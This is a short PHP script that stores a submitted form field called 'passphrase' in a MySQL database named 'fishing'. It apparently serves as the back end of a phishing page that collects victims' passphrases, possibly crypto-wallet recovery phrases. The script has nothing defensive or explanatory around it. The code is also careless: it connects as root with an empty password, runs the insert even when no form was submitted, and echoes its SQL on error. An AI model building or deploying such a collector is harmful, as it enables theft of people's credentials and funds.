<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "fishing";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}


// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $passphrase = $_POST['mf-texts'];

    // Sanitize the input to prevent SQL injection
    $passphrase = $conn->real_escape_string($passphrase);
}

// Insert data into the database
$sql = "INSERT INTO your_table_name (passphrase) VALUES ('$passphrase')";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Close the database connection
$conn->close();

?>
